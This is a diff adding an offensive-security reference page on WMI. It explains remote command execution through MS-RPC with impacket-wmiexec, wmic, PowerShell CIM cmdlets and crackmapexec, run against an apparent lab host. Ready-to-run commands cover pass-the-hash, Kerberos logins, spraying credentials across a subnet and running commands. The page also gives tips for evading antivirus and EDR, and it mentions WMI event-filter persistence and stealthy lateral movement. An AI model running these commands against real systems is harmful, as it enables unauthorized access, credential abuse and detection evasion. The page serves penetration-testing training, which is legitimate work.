@@ -1,0 +1,320 @@
+---
+title: WMI
+description: Windows Management Instrumentation - RPC-based remote command execution on TCP 135 plus dynamic high ports - wmiexec.py and wmic workflows, named-pipe internals, and WMI as a stealthier alternative to WinRM for lateral movement.
+mitre: [T1046, T1021.003, T1078, T1059.003]
+d3fend: [D3-NTA]
+impact: [InternalAccess, RCE]
+sidebar:
+  order: 18
+  label: WMI
+---
+
+## TL;DR
+
+WMI (Windows Management Instrumentation) is Microsoft's local-and-remote system-management framework. Operationally, "WMI" usually means **WMI over MS-RPC** - a way to remotely query and control Windows hosts using credentials. Where WinRM uses HTTP, WMI uses MS-RPC (TCP 135 for the endpoint mapper, then dynamic high ports for the actual RPC traffic). The classic operator tool is `wmiexec.py` from Impacket - credentials in, command execution out.
+
+```
+# 1. Service scan
+nmap -sV -p135 <target>
+
+# 2. Credentialed shell via Impacket
+impacket-wmiexec <user>:'<pass>'@<target>
+
+# 3. Pass-the-hash variant
+impacket-wmiexec -hashes :<NT-hash> <user>@<target>
+
+# 4. One-shot command without an interactive shell
+impacket-wmiexec <user>:'<pass>'@<target> 'whoami /priv'
+
+# 5. From a Windows host: wmic (deprecated but still installed)
+wmic /node:<target> /user:<user> /password:'<pass>' process call create "cmd.exe /c <command>"
+```
+
+Success indicator: `impacket-wmiexec` returns `C:\>` prompt, or the one-shot command's output streams back.
+
+## Protocol overview
+
+WMI is a CIM (Common Information Model) implementation. CIM is a standardized data model for representing OS-level concepts (processes, files, services, network connections) as queryable, structured objects. WMI translates CIM queries into Windows API calls.
+
+The transports:
+
+| Component | Port | Purpose |
+| --- | --- | --- |
+| **MS-RPC Endpoint Mapper** | TCP 135 | First contact - client asks "what port is the WMI service on?", server answers |
+| **WMI RPC interface** | Dynamic TCP (typically 49152-65535) | The actual WMI traffic after endpoint mapping |
+| **SMB named pipes** | TCP 445 | Optional - WMI can ride over SMB named pipes instead of dedicated RPC ports |
+
+The dynamic port allocation makes WMI somewhat firewall-unfriendly. The two practical approaches:
+
+1. Open 135 + the entire 49152-65535 range (the lazy enterprise approach)
+2. Pin WMI to a fixed port via registry - possible but rarely done
+
+Most enterprise environments default to #1, with internal segmentation rules permitting RPC traffic between management hosts and the rest of the fleet.
+
+### Why operators use WMI vs WinRM
+
+| Aspect | WinRM | WMI |
+| --- | --- | --- |
+| Transport | HTTP/HTTPS (5985/5986) | MS-RPC (135 + dynamic) |
+| Auth | Negotiate (NTLM/Kerberos) by default | Negotiate (NTLM/Kerberos) by default |
+| Detection signature | Modern EDR logs PowerShell remoting heavily | WMI activity logged differently - often less aggressively monitored |
+| Output | Real PowerShell prompt | Command output via tempfile staging in SMB share |
+| Tool | evil-winrm (interactive) | wmiexec.py (semi-interactive) |
+| Performance | Lower latency, persistent session | Higher latency per command |
+
+Modern defenders catch both. Older configurations sometimes have one off but not the other - WMI is enabled by default on every Windows host since Windows 2000; WinRM requires explicit configuration. So when you're cred'd up against a workstation, WMI usually works and WinRM often doesn't.
+
+### How wmiexec.py works
+
+The "magic" of wmiexec is straightforward:
+
+1. Authenticate to the target via MS-RPC using your credentials
+2. Use the WMI `Win32_Process` class to call `Create("cmd.exe /c <command> > C:\windows\temp\output.txt")`
+3. The remote command runs, output goes to a file on the target
+4. Connect to the target's `ADMIN$` SMB share, read `output.txt`
+5. Delete `output.txt`
+6. Print the contents back to your console
+
+The semi-interactive feel is achieved by repeating steps 2-5 for each line you type. Each command is its own roundtrip, which is why the prompt feels slower than evil-winrm's persistent session.
+
+The dependency on SMB for output retrieval means:
+
+- TCP 445 must also be reachable from your attack box
+- Your account needs admin-level read access to `ADMIN$` (defaults to local admin / Domain Admin)
+- Output files briefly appear on disk - antivirus and EDR sometimes catch the filename pattern
+
+### Permission requirements
+
+To execute commands via WMI remotely, the calling account needs:
+
+1. **`Remote Enable`** permission in the root\cimv2 WMI namespace (Administrators have this by default)
+2. **`Method Execute`** permission on the `Win32_Process` class
+3. **Access to `ADMIN$`** for output retrieval (admins have it; non-admin accounts typically don't)
+
+In practice this means "local admin or higher." Some specific configurations allow non-admin WMI access to certain namespaces, but command-execution-via-Win32_Process is admin-only by default.
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap -sV -p135 10.129.14.128
+```
+
+```
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+```
+
+The endpoint mapper itself doesn't reveal much. To enumerate the registered RPC interfaces, use `rpcdump.py` from Impacket:
+
+```shell
+impacket-rpcdump 10.129.14.128 | head -30
+```
+
+```
+Protocol: [MS-WMI]: Windows Management Instrumentation Remote Protocol
+Provider: wmiprvse.exe
+UUID    : 1A417CCE-FDFA-4D54-BAEE-2C36F4E5DD27 v1.0
+Bindings:
+        ncacn_ip_tcp:10.129.14.128[49664]
+
+Protocol: [MS-EVEN6]: EventLog Remoting Protocol Version 6.0
+Provider: wevtsvc.dll
+UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0
+Bindings:
+        ncacn_ip_tcp:10.129.14.128[49675]
+
+Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote Protocol
+Provider: lsasrv.dll
+UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0
+Bindings:
+        ncacn_ip_tcp:10.129.14.128[49669]
+
+...
+```
+
+The output lists every RPC interface the host exposes, along with the dynamic ports they're bound to. For WMI specifically you want **`[MS-WMI]`** - the Windows Management Instrumentation Remote Protocol - bound to port 49664 in the example above.
+
+### Credentialed shell - impacket-wmiexec
+
+```shell
+impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128
+```
+
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+```
+
+The `C:\>` prompt accepts commands. Each command is a fresh WMI call + SMB read:
+
+```
+C:\>whoami
+infreight\administrator
+
+C:\>hostname
+DC01
+
+C:\>ipconfig
+Windows IP Configuration
+   ...
+```
+
+Limitations of the semi-interactive shell:
+
+- No interactive sessions - anything that needs stdin won't work (no `nslookup` interactive mode, no `cmd /k`)
+- Working directory persists across commands within the same session (the shell tracks it)
+- Each command has ~1-2s overhead from the WMI + SMB roundtrip
+
+### One-shot command
+
+When you don't need a session, just run one command:
+
+```shell
+impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128 'whoami /priv'
+```
+
+Runs the single command and exits. Useful for scripting (loop over a host list, run a recon command, collect output).
+
+### Pass-the-hash
+
+```shell
+impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
+                 INFREIGHT/Administrator@10.129.14.128
+```
+
+The `-hashes` argument takes `<LMHash>:<NTHash>`. Modern Windows has no LM hash so the LM portion is left blank.
+
+### Connection variations
+
+```shell
+# By IP, no domain (local account)
+impacket-wmiexec Administrator:'P4ssw0rd!'@10.129.14.128
+
+# By hostname (requires DNS or /etc/hosts mapping)
+impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@dc01.infreight.htb
+
+# Kerberos auth (with TGT cached in KRB5CCNAME)
+impacket-wmiexec -k -no-pass INFREIGHT/Administrator@dc01.infreight.htb
+
+# Specify a custom destination directory (for output staging) - bypasses some AV
+impacket-wmiexec -share C$ -path C:\\Users\\Public INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128
+```
+
+`-share` and `-path` let you write the temp output file to a non-default location. ADMIN$ → C$ is a minor evasion; some EDR products specifically watch ADMIN$ writes.
+
+### wmic from a Windows attack box
+
+`wmic` is the built-in Windows CLI for WMI. It's "deprecated" (Microsoft has been saying so since 2016) but still ships in all Windows versions:
+
+```cmd
+wmic /node:10.129.14.128 /user:Administrator /password:"P4ssw0rd!" computersystem list brief
+```
+
+```
+Domain          Manufacturer            Model                     Name        TotalPhysicalMemory
+infreight.htb   VMware, Inc.            VMware Virtual Platform   DC01        4294430720
+```
+
+Command execution via wmic:
+
+```cmd
+wmic /node:10.129.14.128 /user:Administrator /password:"P4ssw0rd!" ^
+     process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
+```
+
+`process call create` returns a process handle but doesn't return stdout - you'd then need a separate read of the output file via SMB. wmiexec.py automates this; wmic doesn't.
+
+### PowerShell WMI alternative
+
+For interactive WMI queries (not command execution), PowerShell's CIM cmdlets work nicely:
+
+```powershell
+$cred = Get-Credential
+
+# Get OS info
+Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_OperatingSystem
+
+# List processes
+Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_Process |
+  Select-Object Name, ProcessId, CommandLine
+
+# List services
+Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_Service
+
+# Logged-in user
+Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_ComputerSystem |
+  Select-Object UserName
+
+# List local users (security event log query - admin only)
+Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_UserAccount
+```
+
+Each `Get-CimInstance` query opens a fresh DCOM/WMI session, runs the query, returns objects. Good for one-off recon; less good for executing commands.
+
+### crackmapexec wmi module
+
+```shell
+crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+
+# With pass-the-hash
+crackmapexec wmi 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Execute a command via WMI
+crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!' -x 'whoami'
+
+# PowerShell command (preferred for AV evasion via in-memory execution)
+crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!' -X 'whoami'
+
+# Spray across many hosts
+crackmapexec wmi 10.0.0.0/24 -u Administrator -H <hash>
+```
+
+`-x` uses cmd.exe; `-X` uses PowerShell. Both are WMI under the hood; PowerShell tends to look slightly less suspicious in security logs because PowerShell remoting is "normal admin activity" in many environments.
+
+## Common chained workflows
+
+**Subnet credential validation:**
+1. `crackmapexec wmi 10.0.0.0/24 -u Administrator -H <hash>`
+2. Each line of output tells you which hosts the cred works on
+3. Prioritize follow-up by target value (DCs first, then file servers, then user workstations)
+
+**WMI when WinRM is firewalled:**
+1. Target has 5985 firewalled but 135 + dynamic RPC range allowed (common in legacy networks)
+2. `evil-winrm` fails, but `wmiexec` succeeds
+3. Same auth, different transport
+
+**WMI persistence - Event Filter to Consumer:**
+1. With WMI command exec on a target, install a WMI Event Filter that triggers on a specific event
+2. Bind to a CommandLineEventConsumer that runs your payload
+3. Survives reboots, isn't visible to most file-based AV
+4. See [WMI persistence reference](https://github.com/0xbadjuju/Tortuga) for details - out of scope for footprinting but worth knowing
+
+**WMI for stealthy lateral movement:**
+1. WMI traffic blends in with normal management activity in many environments
+2. Lacks the prominent "PowerShell Remoting Session Opened" event-log signature of WinRM
+3. Useful when EDR is tuned aggressively on WinRM/PSExec but less so on WMI
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV -p135 <target>` |
+| RPC interface dump | `impacket-rpcdump <target>` |
+| Interactive shell (password) | `impacket-wmiexec <user>:'<pass>'@<target>` |
+| Interactive shell (hash) | `impacket-wmiexec -hashes :<NT-hash> <user>@<target>` |
+| Domain credential | `impacket-wmiexec DOMAIN/user:'<pass>'@<target>` |
+| One-shot command | `impacket-wmiexec <user>:'<pass>'@<target> '<command>'` |
+| Kerberos auth | `impacket-wmiexec -k -no-pass DOMAIN/user@<target>` |
+| Custom output dir | `impacket-wmiexec -share C$ -path C:\\Users\\Public <user>:<pass>@<target>` |
+| wmic process create (Windows) | `wmic /node:<target> /user:<user> /password:"<pass>" process call create "<cmd>"` |
+| PowerShell query | `Get-CimInstance -ComputerName <target> -Credential $cred -ClassName Win32_Process` |
+| Cme cred test | `crackmapexec wmi <target> -u <user> -p '<pass>'` |
+| Cme exec command | `crackmapexec wmi <target> -u <user> -p '<pass>' -x '<cmd>'` |
+| Cme PowerShell exec | `crackmapexec wmi <target> -u <user> -p '<pass>' -X '<cmd>'` |
+| Subnet scan | `crackmapexec wmi 10.0.0.0/24 -u <user> -H <hash>` |
